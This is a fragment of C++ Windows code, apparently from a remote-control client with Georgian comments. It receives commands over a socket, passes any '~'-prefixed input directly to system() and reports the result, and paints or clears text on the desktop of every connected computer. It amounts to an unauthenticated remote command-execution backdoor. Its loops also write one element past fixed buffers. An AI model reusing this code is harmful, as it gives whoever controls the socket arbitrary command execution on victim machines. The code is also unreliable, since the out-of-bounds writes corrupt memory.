
	else if(buf[0]=='A'&&buf[1]=='L'&&buf[2]=='L')
	{
		//////////////////// yvela kompiuteris gatishvis brdzaneba /////////////////////
		bytesReceived = recv(sock,buf,4096,0);
			 if(buf[0]=='~')
				{
					buf[0]=' ';
			
					int returns=system(buf);


							if(returns ==-1)
							{
								userInput="-1 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}

					
							if(returns ==0)
							{
								userInput="0 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}
							if(returns ==1)
							{
								userInput="1 \n";
								sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
								firststart=1;
							}

				}

	/////////////// yvela kompiuteris ekranze teqstis gamotanis brdzaneba ////////////////////////
			 				
			 else	if(buf[0]=='*')
					{
						static int Cbuf;
						char clearr[1000];
						for(int i=0;i<=1000;i++){
								clearr[i]=' ';
								}
						TextOut(hdc,50,200,clearr,1000);
						PAINTSTRUCT ps;
						HDC hdc1 = BeginPaint(GetDesktopWindow(), &ps);
						FillRect(hdc1, &ps.rcPaint, (HBRUSH) (COLOR_WINDOW+1));
				//      EndPaint(GetDesktopWindow(), &ps);
						SetTextColor(hdc,RGB(239, 2, 2));
						HFONT	hTmp=(HFONT)SelectObject(hdc,hfont);
					//	SetBkMode(hdc,1);
						TextOut(hdc,50,200,buf,strlen(buf));
						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
						userInput="TEXTIS GAMOTANA YVELAS KOMPIUTERZE\n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
						Cbuf=strlen(buf);
							
							/*
							DeleteObject(SelectObject(hdc,hTmp));
							EndPaint(GetDesktopWindow(), &ps);

								SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
								*/
						
					}
			 	else if(buf[0]=='#')
					{
						char clear[1200];
						for(int i=0;i<=1200;i++)
						{
							clear[i]=' ';
						}
						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
						TextOut(hdc,50,200,clear,strlen(clear));
					
						userInput="TEXTI WAISHALA YVELAS KOMPIUTERZE \n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
						SendMessage(GetDesktopWindow(),WM_SIZE,0,1);
					}


	}


